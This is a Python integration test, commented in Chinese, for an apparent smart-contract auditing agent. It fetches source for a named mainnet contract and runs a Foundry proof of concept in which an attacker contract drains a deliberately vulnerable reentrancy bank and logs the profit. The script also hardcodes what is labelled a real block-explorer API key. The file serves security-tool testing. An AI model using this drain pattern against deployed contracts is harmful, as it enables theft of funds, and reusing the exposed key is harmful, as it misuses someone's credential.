import asyncio
import logging
import json
import os
from app.services.agent.tools.foundry_tools import FoundryCastTool, FoundryTestTool
from app.services.agent.tools.sandbox_tool import SandboxManager, SandboxConfig

# 开启 DEBUG 日志，以便清晰看到 SandboxManager 内部真正下发的 Docker 命令
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s | %(levelname)-7s | %(name)s | %(message)s'
)
logger = logging.getLogger("RealIntegration")

REAL_BASESCAN_API_KEY = "9AGF78FY7JGCABG7Q9D843IZH69DBW9KAE" 

async def main():
    logger.info("🚀 [1/4] 正在启动真实的 Docker 沙箱环境 (deepaudit/sandbox:latest)...")
    
    # 🔥 1. 在当前项目下创建一个真实的文件夹，用于挂载
    local_workspace = os.path.abspath("./sandbox_data")
    os.makedirs(local_workspace, exist_ok=True)
    logger.info(f"📂 宿主机挂载目录准备完毕: {local_workspace}")
    
    # 2. 实例化真实的沙箱管理器，传入 workspace_dir
    real_sandbox = SandboxManager(
        config=SandboxConfig(
            image="deepaudit/sandbox:latest", 
            network_mode="bridge",
            timeout=300,
            workspace_dir=local_workspace  # 👈 传入挂载目录
        )
    )
    
    await real_sandbox.initialize()
    if not real_sandbox.is_available:
        logger.error("❌ 沙箱启动失败！请检查 Docker Desktop 是否已启动，以及镜像是否存在。")
        return

    logger.info("✅ 沙箱启动成功！")

    # ==========================================
    # 测试一：真实拉取合约源码 (FoundryCastTool)
    # ==========================================
    logger.info("\n" + "="*60)
    logger.info("🎯 [2/4] 开始测试：真实拉取 etherscan 链合约源码")
    logger.info("="*60)
    
    cast_tool = FoundryCastTool(sandbox_manager=real_sandbox)
    
    # 目标：之前讨论过的 Base 链漏洞合约实现地址
    cast_result = await cast_tool.execute(
        contract_address="0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2",
        chain="mainnet",
        etherscan_api_key=REAL_BASESCAN_API_KEY,
        output_dir="real_src"
    )
    
    if cast_result.success:
        logger.info("✅ 源码拉取成功！解析到的返回数据如下：")
        print(json.dumps(cast_result.data, indent=2, ensure_ascii=False))
        
        # 验证文件是否真的落盘
        ls_cmd = await real_sandbox.execute_command("ls -la /workspace/real_src/")
        logger.info(f"📁 沙箱内部 /workspace/real_src/ 真实文件列表：\n{ls_cmd.get('stdout')}")
    else:
        logger.error(f"❌ 源码拉取失败：{cast_result.error}")


    # ==========================================
    # 准备阶段：在沙箱内写入一个真实的 PoC 测试文件
    # ==========================================
    logger.info("\n" + "="*60)
    logger.info("🛠️ [3/4] 准备阶段：向本地目录写入真实的 PoC 测试代码")
    logger.info("="*60)
    
    # 修复：删除了重复的 SPDX 声明
    poc_code = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// ==========================================
// 1. 存在重入漏洞的受害者合约
// ==========================================
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // 存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 提款（存在先转账后修改状态的致命漏洞）
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");

        // 💥 漏洞点：将 ETH 发送给调用者（如果调用者是合约，会触发其 fallback 函数）
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // 状态更新在外部调用之后
        balances[msg.sender] = 0;
    }
}

// ==========================================
// 2. 黑客的攻击合约
// ==========================================
contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // 💥 触发重入的核心：接收 ETH 时自动回调提款函数
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // 递归调用，掏空资金！
        }
    }

    // 发动攻击
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ether to start attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}

// ==========================================
// 3. Agent 编写的验证套件 (PoC 执行入口)
// ==========================================
contract ExploitTest is Test {
    VulnerableBank bank;
    Attacker attacker;

    function setUp() public {
        bank = new VulnerableBank();
        
        // 模拟真实世界的散户，给金库注入 10 ETH 的总锁仓量 (TVL)
        vm.deal(address(this), 10 ether);
        bank.deposit{value: 10 ether}();

        // 部署黑客合约
        attacker = new Attacker(address(bank));
    }

    function testExploit() public {
        console.log("--- Attack Started ---");
        console.log("Victim TVL before attack:", address(bank).balance / 1e18, "ETH");
        
        // 记录攻击前的余额
        uint256 attackerBalanceBefore = address(attacker).balance;

        // 模拟黑客从某处借了 1 ETH 本金，并启动攻击
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        console.log("--- Attack Completed ---");
        console.log("Victim TVL after attack:", address(bank).balance / 1e18, "ETH");
        
        // 计算净利润 = 攻击后余额 - 攻击前余额 - 1 ETH本金
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore - 1 ether;

        // 🔥 核心约定：打印利润！这是供 Python 工具提取的唯一凭证
        console.log("Profit:", profit / 1e18);

        // 验证攻击确实成功，金库被完全掏空
        assertEq(address(bank).balance, 0);
    }
}
"""
    # 🔥 核心改变：直接用 Python 把代码写到宿主机的 sandbox_data/test/ 目录下
    local_test_dir = os.path.join(local_workspace, "test")
    os.makedirs(local_test_dir, exist_ok=True)
    
    local_poc_file = os.path.join(local_test_dir, "RealExploit.t.sol")
    with open(local_poc_file, "w", encoding="utf-8") as f:
        f.write(poc_code)
        
    logger.info(f"✅ PoC 测试文件已直接写入本地目录: {local_poc_file} (自动映射到沙箱 /workspace/test/)")


    # ==========================================
    # 测试二：真实执行 PoC 并解析结果 (FoundryTestTool)
    # ==========================================
    logger.info("\n" + "="*60)
    logger.info("🔥 [4/4] 开始测试：真实执行 forge test 编译与验证")
    logger.info("="*60)
    
    test_tool = FoundryTestTool(sandbox_manager=real_sandbox)
    
    test_result = await test_tool.execute(
        test_file="test/RealExploit.t.sol",
        test_function="testExploit",
        chain="local", 
        expected_profit=10.0  # 修复：修改为合理的预期利润（最大只能掏空10 ETH）
    )
    
    if test_result.success:
        logger.info("✅ PoC 执行成功！")
        
        # 🔥 新增：直接打印最原始、未解析的底层终端输出
        print("\n" + "="*60)
        print("🛠️ 最原始的底层终端输出 (raw_stdout):")
        print("="*60)
        print(test_result.data.get("raw_stdout", ""))
        print("="*60 + "\n")
        
        logger.info("解析到的返回数据如下：")
        print(json.dumps(test_result.data, indent=2, ensure_ascii=False))
    else:
        error_msg = test_result.error or test_result.data.get("raw_stderr", "未知错误")
        logger.error(f"❌ PoC 执行失败，底层报错：\n{error_msg}")
        
    logger.info("\n🎉 真实环境集成测试全部结束！")

if __name__ == "__main__":
    asyncio.run(main())